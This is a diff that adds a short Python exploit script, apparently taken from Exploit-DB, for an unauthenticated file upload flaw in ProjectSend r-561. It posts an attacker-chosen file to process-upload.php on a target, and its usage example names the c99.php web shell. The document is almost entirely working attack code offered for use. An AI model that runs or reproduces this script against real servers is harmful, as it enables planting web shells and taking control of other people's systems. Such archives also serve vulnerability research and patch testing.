@@ -1,0 +1,24 @@
+#!/usr/bin/python
+
+# Exploit Title: ProjectSend r-651 File Upload
+# Date: December 01, 2014
+# Exploit Author: Fady Mohamed Osman (Exploit-db id:2986)
+# Vendor Homepage: http://www.projectsend.org/
+# Software Link: http://www.projectsend.org/download/67/
+# Version: r-561
+# Tested on: Kubuntu 14.10 x64
+
+
+import sys
+import requests
+scriptName = sys.argv[0]
+if (len(sys.argv) != 3):
+  print "Please enter the target path and the file to upload."
+  print "Example : " + scriptName + " http://10.0.0.2/ProjectSend-r561 c99.php"
+  quit()
+print "Exploiting ProjectSend-r561 File Upload .."
+url = sys.argv[1] + "/" + 'process-upload.php' + '?name=' + sys.argv[2]
+print "Sending Url " + url
+files = {'file': open(sys.argv[2], 'rb')}
+r = requests.post(url, files=files)
+print r.text
